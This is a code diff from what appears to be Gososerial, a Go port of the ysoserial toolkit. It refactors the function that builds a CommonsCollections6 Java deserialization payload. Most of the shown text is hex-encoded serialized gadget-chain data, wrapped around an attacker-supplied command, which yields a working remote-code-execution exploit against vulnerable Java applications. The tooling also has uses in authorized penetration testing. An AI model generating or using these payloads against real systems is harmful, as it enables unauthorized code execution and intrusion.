@@ -1,10 +1,7 @@
 package gadget
 
 import (
-	"bytes"
 	"encoding/hex"
-	"github.com/EmYiQing/Gososerial/ysoserial/util"
-	"strings"
 )
 
 const CC6 = "CommonsCollections6"
@@ -43,24 +40,13 @@ func GetCommonsCollections6(cmd string) []byte {
 		"00106A6176612E6C616E672E4F626A6563740000000000000000000000787076710" +
 		"07E00187371007E0013757200135B4C6A6176612E6C616E672E537472696E673BAD" +
 		"D256E7E91D7B47020000787000000001"
-	finalCmd := bytes.Buffer{}
-	finalCmd.WriteString("74")
-	data := strings.ToUpper(hex.EncodeToString([]byte(cmd)))
-	if len(data)/2 > 0xFFFF {
-		return []byte{}
-	}
-	dataLen := util.Int16ToBytes(uint16(len(data) / 2))
-	finalCmd.WriteString(dataLen)
-	finalCmd.WriteString(data)
+	cmdStr := generateCmd(cmd)
 	suffix := "740004657865637571007E001B0000000171007E00207371007E000F73720" +
 		"0116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576" +
 		"616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020" +
 		"000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C3" +
 		"1660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703" +
 		"F4000000000000077080000001000000000787878"
-	ser, err := hex.DecodeString(prefix + finalCmd.String() + suffix)
-	if err != nil {
-		return []byte{}
-	}
+	ser, _ := hex.DecodeString(prefix + cmdStr + suffix)
 	return ser
 }
